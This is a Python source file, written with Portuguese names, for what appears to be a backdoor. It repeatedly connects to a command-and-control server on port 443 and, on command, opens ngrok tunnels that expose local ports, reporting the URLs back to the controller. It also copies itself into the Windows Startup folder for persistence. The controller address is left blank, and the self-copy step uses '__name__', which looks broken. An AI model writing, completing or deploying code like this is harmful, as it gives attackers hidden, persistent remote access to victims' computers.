import socket
import threading
import time
import os
import subprocess
import logging

CCIP = ""
CCPORT = 443
NGROK_PATH = "caminho"
LOG_FILE = "log do servidor"
LOG_FORMAT = "[%(asctime)s] [%(levelname)s]: %(message)s"

def conf_logging():
    logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format=LOG_FORMAT)

def criando_conexão(CCIP, CCPORT):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((CCIP, CCPORT))
        return client
    except Exception as e:
        logging.error("Erro de conexão CC: %s", str(e))
        return None

def tunelamento(port):
    try:
        cmd = f"{NGROK_PATH} http {port}"
        proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        while True:
            output = proc.stdout.readline().strip()
            logging.info("Ngrok: %s", output.decode("utf-8"))
            if b"Encaminhamento" in output:
                url = output.split()[1].decode("utf-8")
                return url
    except Exception as e:
        logging.error("Erro de tunelamento com Ngrok: %s", str(e))

def wps(client, data):
    try:
        port = int(data.split()[1])
        tunnel_url = tunelamento(port)
        if tunnel_url:
            client.send(f"Tunelamento criado: {tunnel_url}".encode("utf-8") + b"\n")
        else:
            client.send(b"Erro de tunelamento!\n")
    except Exception as e:
        logging.error("Erro no manipulador de dados: %s", str(e))

def handle_client(client):
    try:
        while True:
            data = client.recv(1024).decode().strip()
            if data == "/:morte":
                return
            else:
                threading.Thread(target=wps, args=(client, data)).start()
    except Exception as e:
        logging.error("Erro no manipulador de cliente: %s", str(e))
        client.close()

def autorun():
    filen = os.path.basename(__name__)
    exe_file = filen.replace(".py", ".exe")
    os.system(f"copy {exe_file} \"%AppData%\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"")

if __name__ == "__main__":
    autorun()

    conf_logging()

    while True:
        client = criando_conexão(CCIP, CCPORT)
        if client:
            handle_client(client)
        else:
            time.sleep(3)
